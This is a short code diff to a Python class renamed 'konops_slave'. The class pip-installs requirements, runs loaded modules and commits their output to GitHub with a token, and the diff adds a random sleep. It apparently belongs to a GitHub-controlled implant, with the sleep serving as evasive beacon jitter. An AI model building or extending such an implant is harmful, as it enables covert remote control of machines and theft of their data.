@@ -7,7 +7,9 @@ import gitwrapper
 import json
 import sys
 import datetime
+import time
 import types
+import random
 import subprocess
 
 #configuration path
@@ -17,7 +19,7 @@ mpath="modules/"
 #data path
 dpath="data/"
 
-class Konops :
+class konops_slave:
     def __init__(self, konops_id):
         #Konops id
         self.konops_id = konops_id
@@ -63,8 +65,9 @@ class Konops :
         for library in range(len(self.konops_requirements)):
             subprocess.check_call([sys.executable, '-m', 'pip', 'install', self.konops_requirements[library]])
         
-        
-            
+    def sleep(self):
+        sleep_time = random.randint(120,1000)
+        time.sleep(sleep_time)
     
     def execute(self):
         #Executes the loaded modules.
@@ -96,5 +99,4 @@ class Konops :
         content = json.dumps(module_data)
         #Store the data to a file in github
         gitwrapper.store_to_file(self.token, self.headers, data_filename, commit_message, content)
-        #print(resp2) #always print responses to identify the bugs during debugging.They print errors. 
-        
+        #print(resp2) #always print responses to identify the bugs during debugging.They print errors.
